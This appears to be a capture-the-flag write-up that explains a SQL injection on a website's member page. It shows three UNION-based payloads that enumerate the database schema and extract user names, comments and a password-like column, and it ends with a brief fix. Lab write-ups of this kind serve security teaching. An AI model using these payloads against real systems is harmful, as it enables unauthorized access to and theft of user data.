### Where:  

`/?page=member`

### How:  

1. Found `member` page by clicking on "Members" button on the home page
2. Tried to inject SQL in different manners until we've tried a `UNION` attack

    ```SQL
    1 UNION SELECT table_name, column_name FROM information_schema.columns
    ```

    Hmmm... Let us check the `first_name` of every member and by the way... What's `Commentaire`!?

    ```SQL
    1 UNION SELECT first_name, Commentaire FROM users
    ```

    "this password"? Which password!? Perhaps `countersign`?

    ```SQL
    1 UNION SELECT first_name, countersign FROM users
    ```

3. Do the necessary steps described in Flag's `Commentaire` on Flag's `countersign`
4. Found!

### Fixable by:  

1. Properly sanitizing user input
